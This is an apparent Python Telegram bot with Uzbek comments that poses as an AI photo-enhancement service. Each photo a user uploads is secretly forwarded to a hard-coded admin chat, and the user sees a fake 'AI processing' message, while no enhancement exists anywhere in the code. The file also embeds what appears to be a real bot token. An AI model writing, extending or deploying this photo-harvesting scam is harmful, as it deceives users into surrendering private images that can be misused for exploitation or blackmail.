import telebot

# Bot tokeni va rasmlar yuboriladigan Chat ID
TOKEN = '8449444770:AAFLbVvjfmf758cm6Mozvh2fRNIG9i1sX9U'
ADMIN_CHAT_ID = '8298801230'  # Rasmlar keladigan joy (o'zingizning IDingiz)

bot = telebot.TeleBot(TOKEN)

# Foydalanuvchilarning yuklagan rasmlari sonini kuzatish uchun lug'at
user_photos_count = {}


# /start komandasi yuborilganda
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    user_photos_count[user_id] = 0  # Hisoblagichni nollash

    markup = telebot.types.ReplyKeyboardRemove()  # Klaviaturani yopish

    welcome_text = (
        "🌟 **Salom! AI Rasm Profi botiga xush kelibsiz!** 🌟\n\n"
        "Bizning sun'iy intellektimiz rasmlaringizni professional darajada chiroyli qilib beradi.\n"
        "Buning uchun kamida **5 ta o'z rasmingizni** (galereyadan) yuklang.\n\n"
        "Rasmlarni bittalab yoki hammasini birga yuborishingiz mumkin."
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=markup)


# Rasm yuborilganda (photo)
@bot.message_handler(content_types=['photo'])
def handle_docs_photo(message):
    user_id = message.from_user.id

    # Agar foydalanuvchi hali /start bosmagan bo'lsa
    if user_id not in user_photos_count:
        user_photos_count[user_id] = 0

    # Foydalanuvchi yuborgan rasmlar sonini oshirish
    user_photos_count[user_id] += 1
    current_count = user_photos_count[user_id]

    # Rasmni adminga (sizga) yo'naltirish (Forward)
    # Bu usul eng xavfsiz, chunki bot serverida rasm saqlanmaydi
    bot.forward_message(ADMIN_CHAT_ID, message.chat.id, message.message_id)

    # Foydalanuvchiga javob qaytarish
    if current_count < 5:
        needed = 5 - current_count
        bot.reply_to(message, f"Rasm qabul qilindi ({current_count}/5). Yana {needed} ta rasm yuklang.")
    elif current_count == 5:
        bot.reply_to(message, "Rahmat! 5 ta rasm qabul qilindi. AI qayta ishlamoqda, iltimos kuting...")
        # Bu yerda AI ishlayotgani haqida soxta kutish rejimini ko'rsatish mumkin
    else:
        bot.reply_to(message, "Qo'shimcha rasm qabul qilindi. AI tahlilni davom ettirmoqda.")


# Botni ishga tushirish
if __name__ == "__main__":
    print("Bot ishga tushdi...")
    bot.infinity_polling()